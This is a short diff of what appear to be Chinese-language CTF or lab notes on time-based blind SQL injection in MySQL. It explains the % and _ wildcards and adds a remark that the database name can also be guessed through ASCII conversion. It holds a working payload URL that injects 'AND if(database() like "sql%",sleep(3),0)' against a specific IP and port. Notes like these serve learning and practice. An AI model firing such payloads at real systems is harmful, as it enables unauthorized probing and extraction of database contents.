@@ -1,3 +1,4 @@
+此注入也可以使用ascii码转换进行猜解
 mysql中，%代表任意多个字符，_代表一个字符
 http://103.238.227.13:10084/index.php?id=1 AND if(database() like "sql%",sleep(3),0)
 
